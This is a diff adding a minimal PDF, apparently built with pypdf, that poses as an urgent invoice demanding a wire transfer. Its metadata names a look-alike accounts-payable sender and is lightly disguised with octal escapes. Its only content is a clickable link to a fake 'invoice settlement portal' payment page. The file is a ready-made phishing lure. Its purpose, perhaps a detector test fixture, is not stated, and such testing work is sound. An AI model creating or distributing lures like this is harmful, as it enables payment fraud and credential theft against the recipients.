@@ -1,0 +1,63 @@
+%PDF-1.3
+%‚„œ”
+1 0 obj
+<<
+/Producer (pypdf)
+/Title (URGENT INVOICE \043INV\05599201\055REV)
+/Author (Accounts Payable Dept \050billing\100global\055secure\055vendor\056net\051)
+/Subject (Mandatory Wire Transfer Authorization for Outstanding Balance)
+/Creator (Accounting Automation Suite v4\0562)
+>>
+endobj
+2 0 obj
+<<
+/Type /Pages
+/Count 1
+/Kids [ 4 0 R ]
+>>
+endobj
+3 0 obj
+<<
+/Type /Catalog
+/Pages 2 0 R
+>>
+endobj
+4 0 obj
+<<
+/Type /Page
+/Resources <<
+>>
+/MediaBox [ 0.0 0.0 612 792 ]
+/Parent 2 0 R
+/Annots [ 5 0 R ]
+>>
+endobj
+5 0 obj
+<<
+/Type /Annot
+/Subtype /Link
+/Rect [ 100 500 400 540 ]
+/A <<
+/S /URI
+/URI (https\072\057\057secure\055invoice\055settlement\055portal\056xyz\057pay\055urgent\055invoice)
+>>
+/P 4 0 R
+>>
+endobj
+xref
+0 6
+0000000000 65535 f 
+0000000015 00000 n 
+0000000307 00000 n 
+0000000366 00000 n 
+0000000415 00000 n 
+0000000527 00000 n 
+trailer
+<<
+/Size 6
+/Root 3 0 R
+/Info 1 0 R
+>>
+startxref
+729
+%%EOF
